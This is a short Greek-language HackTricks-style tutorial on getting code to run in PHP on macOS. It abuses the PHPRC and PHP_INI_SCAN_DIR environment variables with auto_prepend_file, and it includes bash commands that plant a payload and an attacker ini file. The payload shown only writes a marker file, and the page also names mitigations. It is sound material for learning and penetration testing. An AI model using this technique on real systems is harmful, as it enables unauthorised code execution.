# Injection σε PHP Applications στο macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` και `auto_prepend_file`

Τα PHP CLI και CGI διαβάζουν τις ρυθμίσεις σε κάθε εκτέλεση. Το `PHPRC` μπορεί να επιλέξει ένα `php.ini` αναγνώσιμο από τον attacker, ενώ το `PHP_INI_SCAN_DIR` μπορεί να ανακατευθύνει τον κατάλογο στον οποίο γίνεται αναζήτηση πρόσθετων αρχείων `.ini`. Η οδηγία `auto_prepend_file` κάνει το PHP να αναλύει ένα αρχείο πριν από το ζητούμενο script, επομένως αυτός ο συνδυασμός οδηγεί σε εκτέλεση κώδικα κατά την εκκίνηση.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Μια εναλλακτική είναι ένας κατάλογος που περιέχει ένα αρχείο `.ini`:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
Η επιλογή `-n` αγνοεί το `php.ini`· μια ρητή έμπιστη διαδρομή `-c` έχει προτεραιότητα έναντι του `PHPRC`. Να θυμάστε ότι ένα long-lived server SAPI συνήθως διαβάζει τη διαμόρφωση κατά την εκκίνηση του web server, ενώ τα CLI και CGI το κάνουν σε κάθε invocation.<sup>[[1]](#references)</sup>

## References

- [1] [Αρχείο διαμόρφωσης PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
